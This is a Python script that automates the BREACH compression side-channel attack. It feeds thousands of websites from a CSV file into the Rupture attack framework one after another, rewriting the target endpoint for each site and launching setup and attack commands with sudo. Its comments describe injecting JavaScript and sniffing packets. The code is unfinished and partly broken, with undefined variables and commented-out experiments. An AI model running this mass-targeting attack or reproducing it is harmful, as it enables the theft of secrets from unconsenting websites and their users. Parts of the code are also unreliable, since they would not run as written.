import copy
from ruamel.yaml import YAML
import argparse
import subprocess
from subprocess import Popen, PIPE, STDOUT

'''
STEPS TO LAUNCH BREACH ATTACK

1.) Read a CSV file containing a list of vulnerable website  (Note: csv file is one of the exact sheet extracted 
    from the 20k excel file)

2.) Select 1 URL to attack and modify the 'endpoint' parameter under target_config.yml

3.) Setup the BREACH attack with the following command: "./rupture --setup" and input the selected id into terminal and
    deploy the backend, realtime and sniffer with the following command: "sudo ./rupture --attack". Might need to input
    password

4.) Start the packet sniffer to record packets into a pcap file, filtering on ipaddress of local and foreign. (Note: it is
    not really possible to filter on ports because multiple sockets are opened to attack the target server)

5.) Launch the chrome website with the injected javascript from the newly created 'client_?' directory

6.) Wait until 60 sec timoue OR 1 round of sampling

7.) Stop the packet sniffer and save the packets into a pcap file

8.) Remove the 'client_?' directory from .rupture/client

9.) Shutdown the chrome session

10.) Repeat steps 2-10 for the following url

'''

parser = argparse.ArgumentParser()
parser.add_argument('-t', '--target', help='Input the full/relative directory to target_config.yml', required=True)
args = parser.parse_args()

csvfile_dir = 'ip-domain.csv'
target_config_dir = args.target

yaml = YAML(typ='rt') # Round trip loading and dumping
yaml.preserve_quotes = True
yaml.indent(mapping=4, sequence=4)

# STEP 1
with open(csvfile_dir,'r') as csvfile:
    samples = [sample.strip().split('/') for sample in csvfile.readlines()]
    # print(len(samples)) # 7006

    # STEP 2
    for i, (url, ip_addr) in enumerate(samples):
        with open(target_config_dir, 'r+') as target_config:
            target_config_yaml = yaml.load(target_config)
            formatted_url = 'https://'+url+'/?ref=%s'
            # Create a new config setting by stealing the default config setting from ruptureit
            if 'vulnerable' not in target_config_yaml:
                target_config_yaml['vulnerable'] = copy.deepcopy(target_config_yaml['ruptureit'])
                target_config_yaml['vulnerable']['prefix'] = '/'
                target_config_yaml['vulnerable']['secretlength'] = 0
            target_config_yaml['vulnerable']['endpoint'] = formatted_url
            target_config.seek(0)
            yaml.dump(target_config_yaml, target_config)
            target_config.truncate()

        # STEP 3
        # output = subprocess.run(["ls","-l"], capture_output=True)
        # print(output.stdout)
        # print(output.stderr)

        # proc = Popen(['sudo','ls','-l'], stdout=PIPE, stderr=PIPE)
        # stdout, stderr = proc.communicate(input=b'\n\n\n')
        # print(stdout)
        # print(stderr)

        # from subprocess import Popen, PIPE
        # p = Popen(['python test_enter.py'], stdin=PIPE, shell=True)
        # p.communicate(input=b'0')
        
        # exit()

        setup_command = './rupture --setup'.split()
        setup_proc = Popen(command,stdin=PIPE, stdout=PIPE, stderr=PIPE)
        stdout, stderr = proc.communicate(b'0') # Choose id 0 

        attack_command = './rupture --attack'.split()
        # Have to manually input password for the first time
        # sudo timeout is set to -1 for sudo privileges to last the session
        attack_proc = Popen(['sudo']+attack_command)

        # exit()


        



